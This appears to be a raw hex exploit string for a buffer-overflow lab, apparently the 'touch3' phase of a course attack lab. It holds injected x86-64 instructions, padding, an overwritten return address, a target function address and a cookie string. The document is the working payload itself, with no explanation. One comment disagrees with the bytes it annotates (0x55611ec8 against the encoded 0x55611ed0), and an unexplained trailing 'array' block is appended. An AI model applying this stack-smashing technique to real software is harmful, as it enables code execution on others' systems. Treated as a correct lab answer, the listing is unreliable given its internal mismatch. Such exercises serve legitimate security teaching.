48 c7 c7 c0 1e 61 55 	/* mov    $0x55611ec0,%rdi */
48 c7 c6 d0 1e 61 55 	/* mov    $0x55611ec8,%rsi */
c3
00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
58 1e 61 55 00 00 00 00 /* return addr (rsp) */
ac 18 40 00 00 00 00 00 /* touch3 addr */
33 38 31 65 38 33 30 35
00 00 00 00 00 00 00 00 /* cookie string */
c3 09 00 00 18 16 00 00 /* array */
b8 0a 00 00 1f 14 00 00
80 0a 00 00 8f 0a 00 00
